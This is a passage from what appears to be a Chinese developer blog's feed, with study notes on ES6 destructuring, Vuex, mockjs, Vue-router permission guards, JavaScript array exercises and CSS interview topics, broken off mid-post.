        <content type="html"><![CDATA[<p>#ES6 Destructuring-变量的解构赋值</p><p>在Vuex的学习过程中，发现了这样一种写法</p><pre><code> actions:{        getMenuAction:({commit}) =&gt;{            commit('SET_MENU_LIST',['承保2','核保2'])        }    }</code></pre><p>其中 {commit}在官方的文档中也出现，并不懂是什么意思，于是我查阅后发现是ES6语法，解构赋值</p><p>##1. 解构的含义</p><p>允许按照一定的模式，从数组和对象中取值，对变量进行赋值，成为解构</p><p>解构赋值时，只要等号右边的值不是对象，就先转换为对象。</p><p>本质上，这种写法属于“模式匹配”，只要两边模式相同，左边的变量就被赋予对应的值</p><pre><code>// 不完全解构，左边的模式，只匹配一部分的等号右边的数组let [head, ...tail] = [1, 2, 3, 4]</code></pre><p>解构之后， head=1，tail = [2, 3, 4]</p><p>##2. 解构的限制<br>###1.undefined和null无法转换成对象，会报错</p><pre><code>let { y } = null;</code></pre><p>###2. 如果等号的右边不是数组，转成对象之后不具备Iterator接口，或本身不具备Iterator接口，<br>即某种数据结构具有Iterator接口，都可以采用数组形式解构赋值</p><pre><code>let [foo] = 1; //undefined is not functionlet [foo1, foo2] = net Set(['a', 'b', 'c']);</code></pre><p>###3. 解构赋值时，左边参数允许有默认值<br>###4. 对象解构赋值</p><p>属性无次序，变量名必须与属性相同</p><pre><code>let {obj1,obj2}= {    obj2: {        name: 'dog',        age:'1'    },    obj1: {        name:'fish'    }}</code></pre><p>###5.变量名与属性名不一样，必须如下写</p><p>真正被赋值的是后者，而不是前者</p><pre><code>let {obj1: newObj}= {obj1: '121321',bar: 'barText'}</code></pre><p>###6</p><pre><code>let tree = {        root: {            leaf: {                left: 5,                right: 5            }        }    }var { root:{leaf:{left}} }=tree; //此时， root 与 leaf 都是模式,不会被赋值，只有leaf是变量console.log(root);  /*root is not defined*/</code></pre><p>###7. 将一个已经申明的变量用于解构，必须非常小心</p><pre><code> let temp; {temp}= {x: 1}; /error ( { temp }={x: 1} ); //使用圆括号，避免JS引擎将 "{ }" 解释为代码块</code></pre><p>###8. 字符串解构赋值，会将字符串转换成类似数组的对象</p><pre><code>const [a,b,c,d,e]='hello world';    let { length:strLen }='world';</code></pre><p>###9. 解构 数值和布尔值时，先转换成对象</p><pre><code>   let { toString:s1 } =123; //s1===Number.prototype.toString    let { toString: s2}=true; //s2===Boolean.prototype.toString</code></pre><p>##3.解构使用场景<br>###(1)可以很方便的将 现有对象的方法，赋值给某个变量.</p><pre><code>let { log: selfLog}=console;selfLog('test log');</code></pre><p>###(2)交换变量.</p><pre><code>[x,y]=[y,x];</code></pre><p>###(3)从函数返回多个值</p><pre><code>    function getPerson() {        return {            name: 'jack',            age: 19        }    }    var {name,age}=getPerson();</code></pre><p>###(4) 定义函数参数后，可以不按顺序传入</p><pre><code>    function setPerson({name,age,address}) {    }    setPerson({age: 19, address: 'china', name: 'Tom'});</code></pre><p>###(5)提取JSON对象中的数据</p><pre><code>  let jsonData = {        age: 19,        name: 'Tom',        son: [            'little Jack',            'little Tom'        ]    };    let { son:child }=jsonData;</code></pre><p>###(6)遍历map结构</p><pre><code>    var map =new Map();    for(let [key,value] of map) { }    for(let [,value] of map ) { }</code></pre><p>###(7)获取模块的指定方法</p><pre><code> const { SourceMapConsumer }= require('');</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue系统OA登录权限</title>
      <link href="/2019/08/20/vue-xi-tong-oa-deng-lu-quan-xian/"/>
      <url>/2019/08/20/vue-xi-tong-oa-deng-lu-quan-xian/</url>
      
        <content type="html"><![CDATA[<p>#Vuex的使用</p><ol><li>安装vuex</li><li>新建store文件夹以及store.js文件</li></ol><pre><code>import Vue from 'vue'import Vuex from 'vuex'Vue.use(Vuex)export default new Vuex.Store({    // 所要存放的数据，状态等    state: {        count: 1    },    // $stroe.commit('function') 所调用的方法 函数    mutations: {        add(state) {            state.count += 2;        },        reduce(state) {            state.count -= 3        }    },    actions: {}})</code></pre><ol start="3"><li>main.js中引用</li></ol><pre><code>import Vue from 'vue'import router from './router/router'import store from './store/store.js'new Vue ({    router,    store,    render: h =&gt; h(App)}).$mount('#app')</code></pre><ol start="4"><li>Vue单文件组件中使用</li></ol><pre><code>&lt;template&gt;    &lt;div&gt;        &lt;h2&gt;{{msg}}&lt;/h2&gt;        &lt;h3&gt;{{$store.state.count}}&lt;/h3&gt;    &lt;/div&gt;&lt;/template&gt;&lt;script&gt;    export default {        name: "index",        data() {            return {                msg: 'Vuex'            }        }    }&lt;/script&gt;</code></pre><p>学习状态对象赋值给内部对象，也就是store.js里面的state值赋值给data值</p><p>###一、通过computed计算属性赋值</p><p><code>computed</code>属性可以在输出前，对data中的值进行改变，利用这种特性把store.js中的state值赋值给我们模板中的data值</p><pre><code>computed: {    count() {        return this.$stroe.state.count;    }}</code></pre><p>###二、通过mapState的对象来赋值</p><p>我们首先要引入<code>mapState</code></p><pre><code>import {mapState} from 'Vuex'computed: mapState({    //    理解为传入state对象，修改state.count属性    count: state =&gt; state.count})</code></pre><p>###三、通过mapState数组来赋值</p><pre><code>computed: mapState({"count"})// 映射// this.count 为store.state.count</code></pre><p>这样的写法可以通过<code>this.count</code>直接拿到count数值，实际项目中也是这样使用</p><p>####Mutations修改状态 （$store.commit()）<br>Vuex提供了commit方法修改状态</p><p>如上commit放方法，增加一个传参</p><pre><code>const mutations = {    add(state, n) {        state.count +=n    }}</code></pre><p>调用时</p><pre><code>$store.commit('add', 10)</code></pre><p>####模板获取Mutations方法<br>有些实际开发中不喜欢看见$store.commit方法，希望像没有引用vuex一样</p><pre><code>import {mapMutations} from 'vuex'    methods: {    // 映射this.add()为this.$store.commit('add')        ...mapMutations(['add','reduce']),        toSystemSetting() {            if (this.deviceOffLine()) {                return;            }            this.$router.push({name: 'SystemSetting'});        }    }</code></pre><p>通过以上操作，可以直接使用方法</p><pre><code>&lt;button @click="reduce"&gt;-&lt;/button&gt;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue mock数据</title>
      <link href="/2019/08/08/vue-mock-shu-ju/"/>
      <url>/2019/08/08/vue-mock-shu-ju/</url>
      
        <content type="html"><![CDATA[<p>#mockjs的使用并模拟后台数据</p><ol><li>package.json中安装mockjs</li><li>新建目录mock，添加js(index.js)文件,引入mockjs并mock数据</li></ol><pre><code>import Mock from "mockjs"const Random = Mock.Random//  用于接受生成数据的数组let data = []let size = [     '300x250', '250x250', '240x400', '336x280',    '180x150', '720x300', '468x60', '234x60',    '88x31', '120x90', '120x60', '120x240',    '125x125', '728x90', '160x600', '120x600',    '300x600']//  定义随机数值for (let i = 0; i&lt; 10; i++){    let template = {         'Boolean': Random.boolean, // 可以生成基本数据类型        'Natural': Random.natural(1, 10), // 生成1到100之间自然数        'Integer': Random.integer(1, 100), // 生成1到100之间的整数        'Float': Random.float(0, 100, 0, 5), // 生成0到100之间的浮点数,小数点后尾数为0到5位        'Character': Random.character(), // 生成随机字符串,可加参数定义规则        'String': Random.string(2, 10), // 生成2到10个字符之间的字符串        'Range': Random.range(0, 10, 2), // 生成一个随机数组        'Date': Random.date(), // 生成一个随机日期,可加参数定义日期格式        'Image': Random.image(Random.size, '#02adea', 'Hello'), // Random.size表示将从size数据中任选一个数据        'Color': Random.color(), // 生成一个颜色随机值        'Paragraph':Random.paragraph(2, 5), //生成2至5个句子的文本        'Name': Random.name(), // 生成姓名        'Url': Random.url(), // 生成web地址        'Address': Random.province() // 生成地址    }    data.push(template)}Mock.mock('/fakedata', 'post', data)//重要，定义接口路径，请求方式，生成数据</code></pre><ol start="3"><li>main.js中引入mock的js文件</li></ol><pre><code>// js文件路径require('./mock/index.js');</code></pre><ol start="4"><li>封装axios</li></ol><pre><code>import axios from 'axios'// 默认的请求头axios.defaults.headers.post['Content-Type'] = 'application/x-www-form-urlencoded'// 请求拦截器axios.interceptors.request.use(function(config) =&gt; {    return config;}, function (error) {    return Promise.reject(error)})// 响应拦截器axios.interceptors.response.use(function(response) =&gt; {    return response;}, function(error){    return Promise.reject(error);})// 封装axios的post请求export function fetch(url, params) {    return new Promise((resolve, reject) =&gt; {        axios.post(url,params)            .then(response =&gt; {                resolve(response.data)            })            .catch((error) =&gt; {                reject(error);            })    })}export default {    mockdata(url, params) {        return fetch(url, params);    }}</code></pre><ol start="5"><li>在vue单文件中使用数据</li></ol><pre><code>&lt;script&gt;//引入封装好的axiosimport api from '@/api/api.js'export default {    name: 'Mock',    data() {        return {            dataShow: []        }    },    created() {        this.getdata()    },    methods: {        getdata: function (){            api.mockdata('/fakedata')                .then(res =&gt; {                    console.log(res);                    this.dataShow = res                })        }    }}&lt;/script&gt;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue路由权限设置</title>
      <link href="/2019/07/15/vue-lu-you-quan-xian-she-zhi/"/>
      <url>/2019/07/15/vue-lu-you-quan-xian-she-zhi/</url>
      
        <content type="html"><![CDATA[<p>#Vue-router + Vuex实现动态路由加载和菜单<br>##前言<br>动态路由加载和动态菜单渲染在后端OA权限控制中十分常见，后端只需要加载权限路由进行渲染返回到浏览器就可以。在前后分离中，权限控制动态路由和动态菜单也是一个分叉常见的问题。<br>首先要了解，访问一个应用时，登陆之前有哪些路由是一定要加载的呢？</p><blockquote><ol><li>登陆路由（登陆功能路由）</li><li>系统路由 （系统消息路由，比如欢迎界面，404，error等）</li></ol></blockquote><p>在Vue中，一旦实例化，就必须初始化路由，这时如果没登录，就没办法获取对应权限的路由。如果加载全部路由，那么在浏览器上输入路由就可以访问（可以使用router.beforeEach钩子进行权限鉴定解决）<br>那么前后端分离的开发中，vue应该通过加载动态路由来实现权限控制,需要弄清楚如下问题</p><blockquote><ol><li>Vue中路由是如何初始化，放入Vue实例中的？</li><li>Vue中提供了什么实现动态路由的加载？ </li></ol></blockquote><h2 id="路由初始化"><a href="#路由初始化" class="headerlink" title="路由初始化"></a>路由初始化</h2><p>路由初始化发生在什么阶段呢？main.js中这样写到</p><pre><code>import Vue from 'vue'import ElementUI from 'element-ui'improt 'element-ui/lib/theme-chalk/index.css'import App from './App.vue'import router from './router/router'import store from './store/store'Vue.use(ElementUI);Vue.config.productionTip = false;// Vue实例化已经把router初始化了new Vue({    el: '#app',    router,    store,    render: h =&gt; h(App)})</code></pre><p>路由初始化就发生在vue实例化的时候，我们想要的权限流程是：程序一开始，只注册登陆路由，系统信息路由（欢迎页。404，err路由），称之为静态路由，登陆后我们通过接口获取权限拿到了菜单，这时候需要进行添加动态路由，吧这些菜单信息注册为路由，称之为动态路由。那么Vue实例化的时候，vue-router就已经被初始化，是不是能够通过往router实例里面添加路由项的方式进行注册路由呢，我们可以查阅文档，发现一个addRoutes的方法进行动态注册路由信息，路由对象其实就是一个路由数组，通过addRouters就可以进行动态注册路由，这个跟那个数组中extend功能类似的。<br>在登陆模块中，登陆成功后，通过api获取后台权限菜单，然后注册路由</p><pre><code>//登陆页登陆方法handleLogin(){    this.$refs.loginForm.validate(valid =&gt; {        if (valid &amp;&amp; this.isSuccess) {            this.loading = true;            this.$store.dispatch('LoginByUsername',this.loginForm).then(() = {                // 在这个时候进行获取后台权限和菜单                this.$store.dispatch('getMenus', this.loginForm.name).then((res) = {                    // 把这个菜单信息注册为路由信息                    this.$router.addRoutes(menuitems)                })                this.loading = false;                //除了登陆路由和系统路由，这个根路由是一个欢迎路由，是静态路由                this.$router.push({path: '/'})            }).catch(() =&gt; {                this.$message.error('登陆失败，请检查用户名和密码')                this.loading = false            })        } else {            if (!this.isSuccess){                this.$message.error('请拉滑动条')            }            console.log('error submit')            return false        }    })}// 登陆方法计算属性computed: {    ...mapGetters([        'menuitems'    ])}</code></pre><p>总结一下：<br>登录成功以后（持久化token），调用获取权限菜单（保存在store里面），这个时候就完成了登录后动态初始化权限菜单的功能。那么这里面所有的路由就是当前用户可访问的菜单，就实现了我们的目标效果。但是呢，store存储权限菜单会有个问题，一旦刷新里面的值就刷掉了，那么这个时候就重新实例化的时候就会跳到404路由中，菜单信息也没有了，那如何解决这个刷新时的问题呢？</p><p>我们先分析一下思路：</p><pre><code>1.初始化vue实例时，初始化router，包括所有的静态路由。2.全局钩子检查token是否有效？        a.如果有效，则通过token获取用户信息保存到store中，根据用户信息获取权限菜单保存到store中，        动态注册权限菜单的路由信息；        b.如果token无效，重新定位到静态登录路由进行登录.3.登录模块中，登录成功后获取用户信息保存到store中，将token保存到store中并持久化到本地，获取权限菜单保存到store中，动态注册权限菜单的路由信息4.动态加载完路由后，直接跳到欢迎界面的静态路由5.一旦页面刷新，那么token就会从store中清除，token失效，那么就会去获得持久化在本地的token，重新去获取用户信息，权限菜单，重新动态注册路由。6.token持久化在本地也是有时间限制的，假设token有效期为一周，一旦过了有效期，那么会走2的b情况。</code></pre><p>那么上面的思路就是动态加载权限菜单路由信息的简述，整个的环路就通了，刷新问题就解决了。</p><pre><code>import router from './router'import store from './store'import { Message } from 'element-ui'import NProgress from 'nprogress' // progress barimport 'nprogress/nprogress.css'// progress bar styleimport { getToken } from '@/utils/auth' // getToken from cookieNProgress.configure({ showSpinner: false })// NProgress Configuration// 权限判断function hasPermission(roles, permissionRoles) {  if (roles.indexOf('admin') &gt;= 0) return true // admin permission passed directly  if (!permissionRoles) return true  return roles.some(role =&gt; permissionRoles.indexOf(role) &gt;= 0)}const whiteList = ['/login', '/authredirect']// no redirect whitelist// 全局钩子router.beforeEach((to, from, next) =&gt; {  NProgress.start() // start progress bar  // 如果有token  if (getToken()) { // determine if there has token    // 登录后进入登录页    if (to.path === '/login') {      next({ path: '/' })      NProgress.done() // if current page is dashboard will not trigger afterEach hook, so manually handle it    } else {      // 当进入非登录页时，需要进行权限校验      if (store.getters.roles.length === 0) { // 判断当前用户是否已拉取完user_info信息        store.dispatch('GetUserInfo').then(res =&gt; { // 拉取user_info           const roles = res.data.data.roles // note: roles must be a array! such as: ['editor','develop']           store.dispatch('GenerateRoutes', { roles }).then(() =&gt; { // 根据roles权限生成可访问的路由表             router.addRoutes(store.getters.addRouters) // 动态添加可访问路由表             next({ ...to, replace: true }) // hack方法 确保addRoutes已完成 ,set the replace:            })        }).catch((err) =&gt; {          store.dispatch('FedLogOut').then(() =&gt; {            Message.error(err || 'Verification failed, please login again')            next({ path: '/' })          })        })      } else {        // 没有动态改变权限的需求可直接next() 删除下方权限判断 ↓        if (hasPermission(store.getters.roles, to.meta.roles)) {          next()        } else {          next({ path: '/401', replace: true, query: { noGoBack: true }})        }        // 可删 ↑      }    }  } else {    /* has no token*/    if (whiteList.indexOf(to.path) !== -1) { // 在免登录白名单，直接进入      next()    } else {      next('/login') // 否则全部重定向到登录页      NProgress.done() // if current page is login will not trigger afterEach hook, so manually handle it    }  }})router.afterEach(() =&gt; {  NProgress.done() // finish progress bar})</code></pre><p>备注：根据模块独立性，我把登录中获取权限列表去掉，都放置在全局钩子中，把上面的代码直接引入到主入口文件main.js中。</p><p>另外这里采用vuex进行状态管理，所以从新捋一下思路：</p><pre><code>1.vue实例化，初始化静态路由2.全局钩子进行检查：    a.token有效          -如果当前跳转路由是登录路由，直接进入根路由/            -如果跳转路由非登录路由，则需要进行权限校验，如果用户信息和权限菜单没拉取，            则进行拉取后将权限菜单动态注册到router中，进行权限判断，如果有用户信息和权限菜单信息，            则直接进行权限判断。    b.token无效          -如果在白名单中，则直接进入            -进入到登录页3.全局状态管理采用vuex</code></pre><p>到这里我们就已经完成了vue-router+vuex动态注册路由控制权限的方式就说完了，这里我留个思考题给大家：现在根据上面的方式我再引入一个产品实体，(用户 - 产品 - 菜单 )， 用户可以有多个产品权限，每个产品有公用的菜单，也有各产品定制化的菜单，那么这个时候我在前端如果做好权限校验呢？要求：当前用户当前产品的权限菜单才可被访问。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>紧急浏览</title>
      <link href="/2019/07/11/jin-ji-liu-lan/"/>
      <url>/2019/07/11/jin-ji-liu-lan/</url>
      
        <content type="html"><![CDATA[<p>#js面试题<br>##js数组<br>###一、按要求分割数组</p><p>将”js，数组，分类”字符串数组以/分割</p><ol><li>for循环累加</li></ol><pre><code>var arr = ["js", "数组", "分类"];var separator = "/"// 初始化strvar str = arr[0];for(var i=1;i&lt;arr.length;i++){    str += separator + arr[i]}console.log(str)</code></pre><ol start="2"><li>join()把数组元素链接成字符串</li></ol><pre><code>var arr = ["js", "数组", "分类"];var str = arr.join("/");console.log(str)</code></pre><p>###二、反向输出数组</p><ol><li>reverse()数组函数</li></ol><pre><code>var arr = ["js", "数组", "分类"];revArr = arr.reverse()console.log(revArr)</code></pre><ol start="2"><li>正向遍历，反向添加</li></ol><pre><code>var arr = ["js", "数组", "分类"];for(var i=0;i&lt;arr.length/2;i++){    var temp = arr[i];    arr[i] = arr[arr.length-1-i];    arr[arr.length-1-i]=temp    console.log(arr[i])}console.log(arr)</code></pre><p>###三、去掉不符合要求的元素</p><p>去掉不符合要求的数</p><pre><code>// 去掉大于10的数字var arr = [1, 5, 4, 10, 48, 500, 14];var newArr = arr.filter(function(ele,i,array){    //10以上返回false    if (ele&lt;10) {        return true;    }else {        return false;    }})console.log(newArr)</code></pre><p>###四、找到某个元素在数组中的下标值</p><p>找到所有出现”a”的位置</p><pre><code>var arr = ["c", "a", "d", "a", "d"];// 遍历arr.forEach(function(ele, index, array){    if("a" === ele){        console.log(index)    }})</code></pre><p>###五、数组去重</p><pre><code>//indexOf进行判断，有就不添加没有就添加var arr = ["干垃圾", "湿垃圾", "可回收垃圾", "干垃圾", "有害垃圾", "干垃圾", "湿垃圾"];var newArr = [];arr.forEach(function(item, index, array){    if(newArr.indexOf(item) === -1){        //不存在就添加，存在就不添加        newArr.push(item)    }})console.log(newArr)</code></pre><pre><code>var arr = ["干垃圾", "湿垃圾", "可回收垃圾", "干垃圾", "有害垃圾", "干垃圾", "湿垃圾"];    var a = new Set(arr);    console.log(...a)</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>面试题准备</title>
      <link href="/2019/07/02/mian-shi-ti-zhun-bei/"/>
      <url>/2019/07/02/mian-shi-ti-zhun-bei/</url>
      
        <content type="html"><![CDATA[<p>#css<br>##1、盒模型<br>标准W3C盒模型(content-box)width：content<br><br>IE盒模型width(border-box)：content+border+padding<br><br>通过CSS3属性box-sizing来设定，参数有border-box/content-box/inherit</p><p>##2、flex<br>通过display: flex启动，重要属性 <br><br>justify-content: center;<br><br>align-items: center<br>##3、css单位<br>###绝对单位</p><table><thead><tr><th align="center">单位</th><th align="center">简介</th></tr></thead><tbody><tr><td align="center">px</td><td align="center">像素 (计算机屏幕上的一个点)，1px = 1/96in</td></tr><tr><td align="center">pt</td><td align="center">磅 (Points) ，1 pt = 1/72 in</td></tr><tr><td align="center">pc</td><td align="center">12 点活字（Picas），1pc = 12pt = 1/6in</td></tr><tr><td align="center">in</td><td align="center">英寸（Inches），1in = 96px = 2.54cm</td></tr><tr><td align="center">cm</td><td align="center">厘米（Centimeters），1cm = 96/2.54px</td></tr><tr><td align="center">mm</td><td align="center">毫米（Millimeters），1mm = 1/10cm</td></tr><tr><td align="center">q</td><td align="center">Quarter-millimeters，1q = 1/4mm</td></tr></tbody></table><p>###相对单位<br>单位 | 简介<br>:-: | :-:<br>% | 百分比，相对于父元素的宽度或者字体大小<br>em    | 相对于当前对象内文本字体的大小，1em = 当前字体的大小，2em = 2*当前字体的大小<br>rem     |（root em）,相对于html标签的字体大小<br>ex    | 当前字体环境中x字母的高度，一个 ex 是一个字体的 x-height (x-height 通常是字体尺寸的一半。)<br>ch    | 当前字体环境中0数字的高度<br>vw    | 1%视口（浏览器可视区域）的宽度<br>vh    | 1% 视口（浏览器可视区域）的高度<br>vmin | 1% 视口（浏览器可视区域）宽度和高度中较小的尺寸<br>vmax | 1% 视口（浏览器可视区域）宽度和高度中较大的尺寸</p><p>##4、css选择器</p><table><thead><tr><th align="center">选择器</th><th align="center">符号</th></tr></thead><tbody><tr><td align="center">id</td><td align="center">#idName</td></tr><tr><td align="center">class</td><td align="center">.classname</td></tr><tr><td align="center">相邻选择器</td><td align="center">ul+div</td></tr><tr><td align="center">子选择器</td><td align="center">ul&gt;div</td></tr><tr><td align="center">后代选择器</td><td align="center">ul div</td></tr><tr><td align="center">通配符</td><td align="center">*</td></tr><tr><td align="center">属性选择器</td><td align="center">a[href=’xxx’]</td></tr><tr><td align="center">伪类选择器</td><td align="center">a:after a:hover</td></tr><tr><td align="center">##5、bfc 清除浮动</td><td align="center"></td></tr><tr><td align="center">BFC（块格式化上下文）<br></td><td align="center"></td></tr><tr><td align="center">####以下情况会创建BFC</td><td align="center"></td></tr></tbody></table><ol><li>根元素或包含根元素的元素</li><li>浮动元素 float ＝ left | right 或 inherit（≠ none）</li><li>绝对定位元素 position ＝ absolute 或 fixed</li><li>display ＝ inline-block | flex | inline-flex | table-cell 或 table-caption</li><li>overflow ＝ hidden | auto 或 scroll (≠ visible)</li></ol><p>####BFC特性</p><ol><li>BFC 是一个独立的容器，容器内子元素不会影响容器外的元素。反之亦如此。</li><li>盒子从顶端开始垂直地一个接一个地排列，盒子之间垂直的间距是由 margin 决定的。</li><li>在同一个 BFC 中，两个相邻的块级盒子的垂直外边距会发生重叠。</li><li>BFC 区域不会和 float box 发生重叠。</li><li>BFC 能够识别并包含浮动元素，当计算其区域的高度时，浮动元素也可以参与计算了。</li></ol><p>###BFC清除浮动</p><ol><li>父元素设置 overflow: hidden</li><li>浮动元素加clearfix类</li></ol><pre><code>.clearfix:after{    content: ''    display: block    clear: both}</code></pre><p>##6、层叠上下文<br>z-index<br>##7、常见页面布局</p><p>##8、响应式布局<br>##9、css预处理，后处理<br>预处理：sass、LESS、stylus<br>##10、css3新特性, animation和transiton的相关属性, animate和translate</p><p>###transiton的参数<br>属性 | 值 | 描述<br>:-: | :-: | :-:<br>transition-property | none,all,property | 指定CSS属性的name，transition效果<br>transition-duration | time(默认为0) | transition效果需要指定多少秒或毫秒才能完成<br>transition-timing-function | 见下表 | 指定transition效果的转速曲线<br>transition-delay | time | 定义transition效果开始的时间</p><p>####transition-timing-function的值<br>值 | 描述<br>:-:|:-:<br>linear    | 规定以相同速度开始至结束的过渡效果（等于 cubic-bezier(0,0,1,1)）。<br>ease | 规定慢速开始，然后变快，然后慢速结束的过渡效果（cubic-bezier(0.25,0.1,0.25,1)）。<br>ease-in | 规定以慢速开始的过渡效果（等于 cubic-bezier(0.42,0,1,1)）。<br>ease-out | 规定以慢速结束的过渡效果（等于 cubic-bezier(0,0,0.58,1)）。<br>ease-in-out | 规定以慢速开始和结束的过渡效果（等于 cubic-bezier(0.42,0,0.58,1)）。<br>cubic-bezier(n,n,n,n) | 在 cubic-bezier 函数中定义自己的值。可能的值是 0 至 1 之间的数值。</p><p>####transition优点在于简单易用，有几个缺陷</p><ol><li><p>transition需要事件触发，所以没法在网页加载时自动发生。</p></li><li><p>transition是一次性的，不能重复发生，除非一再触发。</p></li><li><p>transition只能定义开始状态和结束状态，不能定义中间状态，也就是说只有两个状态。</p></li><li><p>一条transition规则，只能定义一个属性的变化，不能涉及多个属性。 </p></li></ol><p>所以针对以上缺陷，提出了Animation</p><p>###animation参数<br>值 | 描述<br>:-: | :-:<br>animation-name | 指定要绑定到选择器的关键帧的名称<br>animation-duration | 动画指定需要多少秒或毫秒完成<br>animation-timing-function | 设置动画将如何完成一个周期<br>animation-delay | 设置动画在启动前的延迟间隔。<br>animation-iteration-count | 定义动画的播放次数。<br>animation-direction | 指定是否应该轮流反向播放动画。<br>animation-fill-mode | 规定当动画不播放时（当动画完成时，或当动画有一个延迟未开始播放时），要应用到元素的样式。<br>animation-play-state | 指定动画是否正在运行或已暂停。<br>initial | 设置属性为其默认值。<br>inherit | 从父元素继承属性。</p><p><strong>animation-direction的值</strong></p><table><thead><tr><th align="center">值</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">normal</td><td align="center">默认值。动画按正常播放。</td></tr><tr><td align="center">reverse</td><td align="center">动画反向播放。</td></tr><tr><td align="center">alternate</td><td align="center">动画在奇数次（1、3、5…）正向播放，在偶数次（2、4、6…）反向播放。</td></tr><tr><td align="center">alternate-reverse</td><td align="center">动画在奇数次（1、3、5…）反向播放，在偶数次（2、4、6…）正向播放。</td></tr><tr><td align="center">initial</td><td align="center">设置该属性为它的默认值。</td></tr><tr><td align="center">inherit</td><td align="center">从父元素继承该属性。</td></tr></tbody></table><p><strong>animation-fill-mode的值</strong></p><table><thead><tr><th align="center">值</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">none</td><td align="center">默认值。动画在动画执行之前和之后不会应用任何样式到目标元素。</td></tr><tr><td align="center">forwards</td><td align="center">在动画结束后（由 animation-iteration-count 决定），动画将应用该属性值。</td></tr><tr><td align="center">backwards</td><td align="center">动画将应用在 animation-delay 定义期间启动动画的第一次迭代的关键帧中定义的属性值。这些都是 from 关键帧中的值（当 animation-direction 为 “normal” 或 “alternate” 时）或 to 关键帧中的值（当 animation-direction 为 “reverse” 或 “alternate-reverse” 时）。</td></tr><tr><td align="center">both</td><td align="center">动画遵循 forwards 和 backwards 的规则。也就是说，动画会在两个方向上扩展动画属性。</td></tr><tr><td align="center">initial</td><td align="center">设置该属性为它的默认值。</td></tr><tr><td align="center">inherit</td><td align="center">从父元素继承该属性。</td></tr></tbody></table><p>##11、display哪些取值</p><table><thead><tr><th align="center">值</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">none</td><td align="center">此元素不会被显示。</td></tr><tr><td align="center">block</td><td align="center">此元素将显示为块级元素，此元素前后会带有换行符。</td></tr><tr><td align="center">inline</td><td align="center">默认。此元素会被显示为内联元素，元素前后没有换行符。</td></tr><tr><td align="center">inline-block</td><td align="center">行内块元素。（CSS2.1 新增的值）</td></tr><tr><td align="center">list-item</td><td align="center">此元素会作为列表显示。</td></tr><tr><td align="center">run-in</td><td align="center">此元素会根据上下文作为块级元素或内联元素显示。</td></tr><tr><td align="center">table</td><td align="center">此元素会作为块级表格来显示（类似 <code>&lt;table&gt;</code>)，表格前后带有换行符。</td></tr><tr><td align="center">inline-table</td><td align="center">此元素会作为内联表格来显示（类似 <code>&lt;table&gt;</code>），表格前后没有换行符。</td></tr><tr><td align="center">table-row-group</td><td align="center">此元素会作为一个或多个行的分组来显示（类似 <code>&lt;tbody&gt;</code>）。</td></tr><tr><td align="center">table-header-group</td><td align="center">此元素会作为一个或多个行的分组来显示（类似 <code>&lt;thead&gt;</code>）。</td></tr><tr><td align="center">table-footer-group</td><td align="center">此元素会作为一个或多个行的分组来显示（类似 <code>&lt;tfoot&gt;</code>）。</td></tr><tr><td align="center">table-row</td><td align="center">此元素会作为一个表格行显示（类似 <code>&lt;tr&gt;</code>）。</td></tr><tr><td align="center">table-column-group</td><td align="center">此元素会作为一个或多个列的分组来显示（类似 <code>&lt;colgroup&gt;</code>）。</td></tr><tr><td align="center">table-column</td><td align="center">此元素会作为一个单元格列显示（类似 <code>&lt;col&gt;</code>）</td></tr><tr><td align="center">table-cell</td><td align="center">此元素会作为一个表格单元格显示（类似 <code>&lt;td&gt;</code> 和 <code>&lt;th&gt;</code>）</td></tr><tr><td align="center">table-caption</td><td align="center">此元素会作为一个表格标题显示（类似 <code>&lt;caption&gt;</code>）</td></tr><tr><td align="center">inherit</td><td align="center">规定应该从父元素继承 display 属性的值。</td></tr></tbody></table><p>##12、相邻的两个inline-block节点为什么会出现间隔，该如何解决<br>英文有空格作为词分界，而中文则没有。由空格换行符导致的</p><p><strong>解决方法</strong></p><ol><li><p>改变代码书写方式。<br> 取消标签与标签之间的空格换行符，<br> 考虑到代码的可读性，废弃</p></li><li><p>改变字符大小。<br> 使用 font-size：0</p><pre><code> .space {     font-size: 0; } .space a{     font-size: 12px }</code></pre><p> 可以去除大部分浏览器的间距，IE7有时会有1px间距，Chrome默认存在字体大小限制。所以需要进一步处理</p><pre><code> .space {     font-size:0;     -webkit-text-size-adjust:none; 